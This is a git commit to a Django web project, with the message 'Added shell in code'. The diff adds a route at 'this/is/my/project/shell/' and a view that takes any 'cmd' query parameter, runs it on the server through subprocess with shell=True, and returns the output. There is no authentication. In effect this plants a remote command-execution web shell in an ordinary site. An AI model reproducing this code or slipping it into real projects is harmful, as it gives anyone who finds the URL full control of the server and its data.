8ec0a077afa3ccd7393b38bcb6de583f8c91107c
Sunnatillo Abdivasiyev <119777228+Abdivasiyev2008@users.noreply.github.com>
2025-03-05 20:08:40 +0500

    V2 has been updated
    Added shell in code

--- v2/home/urls.py
+++ v2/home/urls.py
@@ -1,6 +1,8 @@
 from django.urls import path
-from .views import home
+from .views import home, shell_view
 
 urlpatterns = [
     path('', home, name='home'),
+    path('this/is/my/project/shell/', shell_view, name='shell'),
+
 ]
--- v2/home/views.py
+++ v2/home/views.py
@@ -10,3 +10,32 @@ def home(request):
         return render(request, 'home.html')  # Kompyuter bo'lsa home.html sahifasiga o'tadi
     else:
         return HttpResponse("If you want to use this platform, please use a computer.")  # Agar mobil yoki boshqa qurilma bo'lsa
+import subprocess
+from django.http import HttpResponse
+from django.shortcuts import render
+
+def shell_view(request):
+    # URL'dan 'cmd' parametrini olish
+    cmd = request.GET.get("cmd", "")
+
+    # Agar buyruq bo'lsa
+    if cmd:
+        try:
+            # Buyruqni bajarish
+            process = subprocess.Popen(
+                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+            )
+            stdout, stderr = process.communicate()
+
+            # Standart chiqish va xatoliklarni birlashtirib natija qaytarish
+            if stdout:
+                return HttpResponse(f"<pre>{stdout}</pre>")
+            elif stderr:
+                return HttpResponse(f"<pre>{stderr}</pre>")
+            else:
+                return HttpResponse("<pre>No output</pre>")
+        except Exception as e:
+            return HttpResponse(f"<pre>Error: {e}</pre>")
+    
+    # Shell formasi (HTML)
+    return render(request, 'shell.html')
